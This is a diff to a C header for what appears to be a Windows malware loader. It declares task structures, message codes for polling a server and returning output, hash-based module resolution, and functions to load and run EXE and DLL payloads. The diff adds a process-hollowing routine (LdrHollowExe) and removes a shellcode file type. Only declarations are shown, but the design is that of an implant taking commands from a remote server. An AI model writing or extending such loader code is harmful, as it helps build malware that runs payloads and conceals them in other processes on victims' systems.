@@ -14,20 +14,22 @@ typedef struct _LdrTask {
 	DWORD DataSize;
 	DWORD FileType;
 	PBYTE Data;
+	PCHAR args;
+	BOOL hasReloc;
 	BOOL ok;
 } LdrTask;
 
 #define FILE_EXE       0xac
 #define FILE_DLL 	   0xab
-#define FILE_SHELLCODE 0xad
 
 #define TASK_LOAD 0x1
-#define TASK_PULL_CORE 0x2
 #define TASK_MODULE 0x3
 #define TASK_NO_TASK 0xff
 
-#define MSG_GET_FILE 0xab
-#define POLL_CODE    0xac
+#define MSG_GET_FILE    0xab
+#define POLL_CODE       0xac
+#define MSG_OUTPUT      0xad
+#define MSG_NEEDS_PARSE 0xaf
 
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 
@@ -37,6 +39,7 @@ typedef struct _Module {
 	DWORD Version;
 
 	void (WINAPI *ModuleWrite4)(PVOID ctx, DWORD val);
+	void (WINAPI *ModuleWrite8)(PVOID ctx, ULONGLONG val);
 	void (WINAPI *ModuleWriteStr)(PVOID ctx, PCHAR str, DWORD len);
 
 	HMODULE (WINAPI *ModuleGetModule)(DWORD hash);
@@ -63,6 +66,7 @@ LdrTask LdrPollServer();
 BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter);
 BOOL LdrRunModule(LdrTask info, BOOL CleanUpAfter);
 BOOL LdrRunExe(LdrTask info);
+BOOL LdrHollowExe(LdrTask info);
 
 BOOL   HasReloc(PBYTE pe);
 DWORD  SectionCharsToProt(DWORD chars);
